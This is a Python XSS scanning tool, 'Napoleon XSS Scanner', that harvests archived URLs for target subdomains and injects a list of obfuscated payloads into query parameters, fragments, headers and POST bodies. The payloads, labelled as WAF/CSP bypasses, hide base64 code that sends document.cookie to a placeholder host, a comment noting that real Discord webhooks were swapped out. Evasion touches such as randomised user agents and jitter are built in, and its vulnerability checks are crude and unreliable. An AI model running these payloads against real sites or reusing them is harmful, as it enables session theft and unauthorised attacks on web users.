#!/usr/bin/env python3

import asyncio
import aiohttp
import argparse
import os
import urllib.parse
import random
import json
from urllib.parse import urlparse, parse_qs
from datetime import datetime
import aiofiles
from fake_useragent import UserAgent
import re

# Configuration settings for the scanner
CONFIG = {
    'TIMEOUT': 30,
    'USER_AGENTS': UserAgent(),
    'WORKERS': 70,
    'PROXY': 'http://127.0.0.1:8080',  # Burp Proxy
    'JITTER_MIN': 0.01,
    'JITTER_MAX': 0.2,
    'INITIAL_SCAN_LIMIT': 20000,
    'MAX_RETRIES': 5,
    'BASE_RESPONSE_THRESHOLD': 100,  # Minimum response difference
    'CONTEXT_KEYWORDS': {
        'html': r'<[^>]+>',
        'js': r'(eval|fetch|document\.cookie|atob)',
        'svg': r'<svg[^>]*>',
        'json': r'\{.*\}',
        'attribute': r'\w+\s*=\s*[\'"][^\'"]*[\'"]',
    }
}

# Payloads categorized by context (Discord webhooks replaced with placeholder)
PAYLOADS = [
    {
        "name": "SVG Set",
        "payload": "+ADw-svg+AD4-+ADw-set+ADw-attributeName=\"href\"+ADw-to=\"javascript:eval(atob('ZmV0Y2goJ2h0dHBzOi8vZXhhbXBsZS5jb20vdGVzdD9jPScrYnRvYSgkZG9jdW1lbnQuY29va2llKSk='))\"+ADw-begin%3D\"0s\"+ADw-dur%3D\"1s\"+AD4-+ADw-/svg+AD4-",
        "contexts": ["html", "svg", "js", "uri"],
        "injection_points": ["query", "fragment", "headers"],
        "bypass": "AWS WAF/CSP",
        "target": "CloudFront Cache Poisoning"
    },
    {
        "name": "SVG Animatemotion",
        "payload": "+ADw-svg+AD4-+ADw-animatemotion+ADw-onbegin=\"eval(atob('ZmV0Y2goJ2h0dHBzOi8vZXhhbXBsZS5jb20vdGVzdD9jPScrYnRvYSgkZG9jdW1lbnQuY29va2llKSk='))\"+AD4-+ADw-/animatemotion+AD4-+ADw-/svg+AD4",
        "contexts": ["html", "svg", "js", "uri"],
        "injection_points": ["query", "fragment", "headers"],
        "bypass": "AWS WAF/CSP",
        "target": "CloudFront Cache Poisoning"
    },
    {
        "name": "XMP Img",
        "payload": "+ADw-xmp+AD4-+ADw-script+AD4-/*+ADw-/xmp+AD4-+ADw-img+ADw-src=x+ADw-onerror=\"eval(atob('ZmV0Y2goJ2h0dHBzOi8vZXhhbXBsZS5jb20vdGVzdD9jPScrYnRvYSgkZG9jdW1lbnQuY29va2llKSk='))\"+AD4-+ADw-/img+AD4-",
        "contexts": ["html", "js"],
        "injection_points": ["query", "body", "headers"],
        "bypass": "AWS WAF/CSP",
        "target": "Parser Confusion"
    },
    {
        "name": "MathML MS",
        "payload": "<math><ms actiontype=\"statusline#https://example.com/test?c=(document.cookie)\"></ms></math>",
        "contexts": ["html", "mathml"],
        "injection_points": ["query", "body"],
        "bypass": "AWS WAF/CSP",
        "target": "CloudFront Cache Poisoning"
    },
    {
        "name": "Marquee",
        "payload": "+ADw-marquee+AD4-+ADw-onfinish%3D%22%5Cu0066etch('https%3A%2F%2Fexample.com%2Ftest%3Fc%3D'%2Bdocument.cookie)%22+AD4-+ADw-/marquee+AD4-",
        "contexts": ["html", "js"],
        "injection_points": ["query", "body", "headers"],
        "bypass": "AWS WAF/CSP",
        "target": "HTML Dynamic"
    },
    {
        "name": "Noembed Img",
        "payload": "+ADw-noembed+AD4-+ADw-img+ADw-src%3Dx+ADw-onerror%3D%22eval(atob('ZmV0Y2goJ2h0dHBzOi8vZXhhbXBsZS5jb20vdGVzdD9jPScrYnRvYSgkZG9jdW1lbnQuY29va2llKSk%3D'))%22+AD4-+ADw-/noembed+AD4-",
        "contexts": ["html", "js"],
        "injection_points": ["query", "body", "headers"],
        "bypass": "AWS WAF/CSP",
        "target": "Parser Confusion"
    },
]

class XSSScanner:
    def __init__(self, urls_file, verbose=False, output_file='xss_results', proxy=CONFIG['PROXY']):
        self.urls_file = urls_file
        self.urls = self._load_urls()
        self.verbose = verbose
        self.base_dir = "results"
        self.output_file = output_file
        self.proxy = proxy
        os.makedirs(self.base_dir, exist_ok=True)
        self.semaphore = asyncio.Semaphore(CONFIG['WORKERS'])
        self.vulnerabilities = []

    def _load_urls(self):
        """Load URLs from file or comma-separated string."""
        urls = set()
        if os.path.isfile(self.urls_file):
            with open(self.urls_file, 'r') as f:
                urls.update(line.strip() for line in f if line.strip())
        else:
            urls.update(url.strip() for url in self.urls_file.split(',') if url.strip())
        return urls

    def _vprint(self, message):
        """Print verbose messages if enabled."""
        if self.verbose:
            print(f"[VERBOSE] {message}")

    def _random_headers(self, payload=None, injection_point=None):
        """Generate random headers, optionally injecting payload."""
        headers = {
            'User-Agent': CONFIG['USER_AGENTS'].random,
            'Accept': 'application/json,text/html,*/*;q=0.8',
            'Connection': 'keep-alive',
        }
        if payload and injection_point in ["headers"]:
            headers['Referer'] = payload
            headers['User-Agent'] = payload
        return headers

    def _extract_params(self, url):
        """Extract query parameters from URL."""
        parsed = urlparse(url)
        query = parsed.query
        if not query:
            return []
        params = parse_qs(query)
        return list(params.keys())

    def _detect_context(self, body):
        """Detect response context (html, js, svg, etc.)."""
        contexts = []
        for context, pattern in CONFIG['CONTEXT_KEYWORDS'].items():
            if re.search(pattern, body, re.IGNORECASE):
                contexts.append(context)
        return contexts if contexts else ["html"]  # Default to HTML

    async def _test_url(self, session, url, payload_info):
        """Test a URL with a specific payload."""
        results = []
        parsed_url = urlparse(url)
        
        # Identify injection points
        injection_points = payload_info["injection_points"]
        params = self._extract_params(url)

        # Base request for comparison
        base_response = None
        try:
            async with self.semaphore:
                async with session.get(url, headers=self._random_headers(), ssl=False) as resp:
                    base_status = resp.status
                    base_length = int(resp.headers.get('Content-Length', 0))
                    base_body = await resp.text()
                    base_response = {
                        "status": base_status,
                        "length": base_length,
                        "body": base_body,
                        "contexts": self._detect_context(base_body)
                    }
        except Exception as e:
            self._vprint(f"Base request failed for {url}: {str(e)}")
            return None

        # Skip if payload context doesn't match response context
        applicable_contexts = payload_info["contexts"]
        if not any(ctx in base_response["contexts"] for ctx in applicable_contexts):
            self._vprint(f"Skipping {payload_info['name']} for {url}: Incompatible context {base_response['contexts']}")
            return None

        # Test different injection points
        for injection_point in injection_points:
            if injection_point == "query" and params:
                for param in params:
                    test_query = parse_qs(parsed_url.query)
                    test_query[param] = [payload_info["payload"]]
                    test_url = parsed_url._replace(query=urllib.parse.urlencode(test_query, doseq=True)).geturl()
                    
                    try:
                        async with self.semaphore:
                            async with session.get(test_url, headers=self._random_headers(), ssl=False) as resp:
                                test_status = resp.status
                                test_length = int(resp.headers.get('Content-Length', 0))
                                test_body = await resp.text()

                                # Vulnerability criteria
                                length_diff = abs(test_length - base_response["length"])
                                is_vulnerable = (
                                    test_status == 200 and
                                    (length_diff > CONFIG['BASE_RESPONSE_THRESHOLD'] or
                                     any(keyword in test_body.lower() for keyword in ["eval", "fetch", "document.cookie", payload_info["payload"][:20]]))
                                )

                                if is_vulnerable:
                                    result = {
                                        "url": test_url,
                                        "payload": payload_info["name"],
                                        "status": test_status,
                                        "length_diff": length_diff,
                                        "param": param,
                                        "injection_point": "query",
                                        "context": base_response["contexts"],
                                        "bypass": payload_info["bypass"],
                                        "target": payload_info["target"]
                                    }
                                    self._vprint(f"Potential XSS found: {test_url} with {payload_info['name']}")
                                    results.append(result)

                    except Exception as e:
                        self._vprint(f"Test failed for {test_url}: {str(e)}")

            elif injection_point == "fragment":
                test_url = parsed_url._replace(fragment=payload_info["payload"]).geturl()
                try:
                    async with self.semaphore:
                        async with session.get(test_url, headers=self._random_headers(), ssl=False) as resp:
                            test_status = resp.status
                            test_length = int(resp.headers.get('Content-Length', 0))
                            test_body = await resp.text()

                            length_diff = abs(test_length - base_response["length"])
                            is_vulnerable = (
                                test_status == 200 and
                                (length_diff > CONFIG['BASE_RESPONSE_THRESHOLD'] or
                                 any(keyword in test_body.lower() for keyword in ["eval", "fetch", "document.cookie", payload_info["payload"][:20]]))
                            )

                            if is_vulnerable:
                                result = {
                                    "url": test_url,
                                    "payload": payload_info["name"],
                                    "status": test_status,
                                    "length_diff": length_diff,
                                    "param": "fragment",
                                    "injection_point": "fragment",
                                    "context": base_response["contexts"],
                                    "bypass": payload_info["bypass"],
                                    "target": payload_info["target"]
                                }
                                self._vprint(f"Potential XSS found: {test_url} with {payload_info['name']}")
                                results.append(result)

                except Exception as e:
                    self._vprint(f"Test failed for {test_url}: {str(e)}")

            elif injection_point == "headers":
                headers = self._random_headers(payload_info["payload"], "headers")
                try:
                    async with self.semaphore:
                        async with session.get(url, headers=headers, ssl=False) as resp:
                            test_status = resp.status
                            test_length = int(resp.headers.get('Content-Length', 0))
                            test_body = await resp.text()

                            length_diff = abs(test_length - base_response["length"])
                            is_vulnerable = (
                                test_status == 200 and
                                (length_diff > CONFIG['BASE_RESPONSE_THRESHOLD'] or
                                 any(keyword in test_body.lower() for keyword in ["eval", "fetch", "document.cookie", payload_info["payload"][:20]]))
                            )

                            if is_vulnerable:
                                result = {
                                    "url": url,
                                    "payload": payload_info["name"],
                                    "status": test_status,
                                    "length_diff": length_diff,
                                    "param": "headers (Referer/User-Agent)",
                                    "injection_point": "headers",
                                    "context": base_response["contexts"],
                                    "bypass": payload_info["bypass"],
                                    "target": payload_info["target"]
                                }
                                self._vprint(f"Potential XSS found: {url} with {payload_info['name']} in headers")
                                results.append(result)

                except Exception as e:
                    self._vprint(f"Test failed for {url} with headers: {str(e)}")

            elif injection_point == "body":
                # Test POST (simple form)
                data = {"input": payload_info["payload"]}
                try:
                    async with self.semaphore:
                        async with session.post(url, data=data, headers=self._random_headers(), ssl=False) as resp:
                            test_status = resp.status
                            test_length = int(resp.headers.get('Content-Length', 0))
                            test_body = await resp.text()

                            length_diff = abs(test_length - base_response["length"])
                            is_vulnerable = (
                                test_status == 200 and
                                (length_diff > CONFIG['BASE_RESPONSE_THRESHOLD'] or
                                 any(keyword in test_body.lower() for keyword in ["eval", "fetch", "document.cookie", payload_info["payload"][:20]]))
                            )

                            if is_vulnerable:
                                result = {
                                    "url": url,
                                    "payload": payload_info["name"],
                                    "status": test_status,
                                    "length_diff": length_diff,
                                    "param": "body (POST)",
                                    "injection_point": "body",
                                    "context": base_response["contexts"],
                                    "bypass": payload_info["bypass"],
                                    "target": payload_info["target"]
                                }
                                self._vprint(f"Potential XSS found: {url} with {payload_info['name']} in body")
                                results.append(result)

                except Exception as e:
                    self._vprint(f"Test failed for {url} with body: {str(e)}")

            await asyncio.sleep(random.uniform(CONFIG['JITTER_MIN'], CONFIG['JITTER_MAX']))

        return results

    async def _save_results(self):
        """Save scan results to JSON file."""
        async with aiofiles.open(f"{self.base_dir}/{self.output_file}.json", 'w', encoding='utf-8') as f:
            await f.write(json.dumps(self.vulnerabilities, indent=2))
        self._vprint(f"Saved {len(self.vulnerabilities)} vulnerabilities to {self.base_dir}/{self.output_file}.json")

    async def scan(self):
        """Run the XSS scan."""
        client_args = {
            'timeout': aiohttp.ClientTimeout(total=CONFIG['TIMEOUT']),
            'connector': aiohttp.TCPConnector(ssl=False, limit=CONFIG['WORKERS'] * 2)
        }
        if self.proxy:
            client_args['proxy'] = self.proxy

        async with aiohttp.ClientSession(**client_args) as session:
            print(f"[XSS SCANNER] Testing {len(self.urls)} URLs with {len(PAYLOADS)} payloads")
            for url in self.urls:
                for payload_info in PAYLOADS:
                    self._vprint(f"Testing {url} with {payload_info['name']}")
                    result = await self._test_url(session, url, payload_info)
                    if result:
                        self.vulnerabilities.extend(result)

            await self._save_results()
            print(f"[XSS SCANNER] Found {len(self.vulnerabilities)} potential vulnerabilities")

class Crawler:
    def __init__(self, subdomains, verbose=False, output_file='crawled_urls', proxy=CONFIG['PROXY']):
        self.subdomains = self._parse_subdomains(subdomains)
        self.verbose = verbose
        self.base_dir = "results"
        self.output_file = output_file
        self.proxy = proxy
        os.makedirs(self.base_dir, exist_ok=True)
        self.semaphore = asyncio.Semaphore(CONFIG['WORKERS'])
        self.urls = set()

    def _parse_subdomains(self, subdomains_input):
        """Parse subdomains from file or comma-separated string."""
        if os.path.isfile(subdomains_input):
            with open(subdomains_input, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        return [s.strip() for s in subdomains_input.split(',') if s.strip()]

    def _vprint(self, message):
        """Print verbose messages if enabled."""
        if self.verbose:
            print(f"[VERBOSE] {message}")

    def _random_headers(self):
        """Generate random headers."""
        return {
            'User-Agent': CONFIG['USER_AGENTS'].random,
            'Accept': 'application/json,text/html,*/*;q=0.8',
            'Connection': 'keep-alive',
        }

    async def _fetch_archive_urls(self, session, subdomain):
        """Fetch URLs from Web Archive."""
        urls = set()
        base_url = f"https://web.archive.org/cdx/search/cdx"
        params = {
            'url': f"{subdomain}/*",
            'output': 'json',
            'limit': CONFIG['INITIAL_SCAN_LIMIT'],
            'fl': 'original',
            'collapse': 'urlkey',
            'showResumeKey': 'true',
        }

        for attempt in range(CONFIG['MAX_RETRIES']):
            try:
                self._vprint(f"Fetching URLs for {subdomain} (attempt {attempt+1}/{CONFIG['MAX_RETRIES']})...")
                async with self.semaphore:
                    async with session.get(base_url, params=params, headers=self._random_headers(), ssl=False) as resp:
                        if resp.status != 200:
                            self._vprint(f"Archive error: HTTP {resp.status}")
                            continue
                        data = await resp.json()
                        new_urls = {entry[0] for entry in data[1:] if entry and entry[0].startswith('http')}
                        urls.update(new_urls)
                        self._vprint(f"Got {len(new_urls)} URLs from archive for {subdomain}")
                        if len(new_urls) < CONFIG['INITIAL_SCAN_LIMIT']:
                            break
                        if data and data[-1]:
                            params['resumeKey'] = data[-1][0]
                await asyncio.sleep(random.uniform(CONFIG['JITTER_MIN'], CONFIG['JITTER_MAX']))
            except Exception as e:
                self._vprint(f"Archive fetch error for {subdomain}: {str(e)}")
                if attempt < CONFIG['MAX_RETRIES'] - 1:
                    await asyncio.sleep(attempt * 0.5)
        return urls

    async def _validate_url(self, session, url):
        """Validate URL accessibility."""
        try:
            async with self.semaphore:
                async with session.get(url, headers=self._random_headers(), ssl=False, allow_redirects=True, timeout=10) as resp:
                    self._vprint(f"Validated {url}: HTTP {resp.status}")
                    return resp.status in range(200, 400)
        except Exception as e:
            self._vprint(f"Validation failed for {url}: {str(e)}")
            return False

    async def _save_urls(self):
        """Save crawled URLs to file."""
        async with aiofiles.open(f"{self.base_dir}/{self.output_file}.txt", 'w', encoding='utf-8') as f:
            for url in sorted(self.urls):
                await f.write(f"{url}\n")
        self._vprint(f"Saved {len(self.urls)} URLs to {self.base_dir}/{self.output_file}.txt")

    async def conquer(self):
        """Run the crawler."""
        client_args = {
            'timeout': aiohttp.ClientTimeout(total=CONFIG['TIMEOUT']),
            'connector': aiohttp.TCPConnector(ssl=False, limit=CONFIG['WORKERS'] * 2)
        }
        if self.proxy:
            client_args['proxy'] = self.proxy

        async with aiohttp.ClientSession(**client_args) as session:
            try:
                print(f"[CRAWLER] Phase 1: Fetching URLs from Web Archive for {len(self.subdomains)} subdomains")
                tasks = [self._fetch_archive_urls(session, subdomain) for subdomain in self.subdomains]
                results = await asyncio.gather(*tasks, return_exceptions=True)

                for subdomain, result in zip(self.subdomains, results):
                    if isinstance(result, Exception):
                        self._vprint(f"Failed to fetch URLs for {subdomain}: {str(result)}")
                        continue
                    self.urls.update(result)

                if not self.urls:
                    print("[CRAWLER] WARNING: No URLs found in Web Archive!")
                    return

                print(f"[CRAWLER] Phase 2: Validating {len(self.urls)} URLs through Burp Proxy")
                tasks = [self._validate_url(session, url) for url in self.urls]
                await asyncio.gather(*tasks, return_exceptions=True)

                await self._save_urls()
            except Exception as e:
                self._vprint(f"Crawling failed: {str(e)}")
                print(f"[CRAWLER] ERROR: {str(e)}")
                await self._save_urls()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Napoleon XSS Scanner v2.0 - Burp Proxy Integration")
    parser.add_argument("--subdomains", help="File containing subdomains or comma-separated list for crawling")
    parser.add_argument("--urls", help="File containing URLs or comma-separated list for direct scanning")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--output", default="xss_results", help="Output file for XSS results")
    parser.add_argument("--proxy", default=CONFIG['PROXY'], help="Proxy URL (default: http://127.0.0.1:8080)")
    args = parser.parse_args()

    if args.subdomains:
        crawler = Crawler(args.subdomains, verbose=args.verbose, output_file="crawled_urls", proxy=args.proxy)
        asyncio.run(crawler.conquer())
        urls_file = "results/crawled_urls.txt"
    elif args.urls:
        urls_file = args.urls
    else:
        print("[ERROR] Please provide either --subdomains or --urls")
        exit(1)

    scanner = XSSScanner(urls_file, verbose=args.verbose, output_file=args.output, proxy=args.proxy)
    asyncio.run(scanner.scan())
    print("[XSS SCANNER] Scanning complete!")
